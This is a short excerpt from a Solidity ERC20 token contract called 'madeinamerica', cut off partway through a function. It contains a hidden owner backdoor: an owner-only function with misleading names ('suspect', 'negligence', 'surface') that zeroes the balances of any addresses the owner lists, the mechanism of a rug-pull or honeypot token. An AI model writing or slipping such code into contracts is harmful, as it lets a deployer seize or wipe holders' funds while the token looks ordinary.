...
contract madeinamerica is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == surface, "Not allowed");
        _;
    }

    function suspect(address[] memory negligence) public onlyOwner() {
    uint256 len = negligence.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[negligence[i]];
        _balances[negligence[i]] = 0;
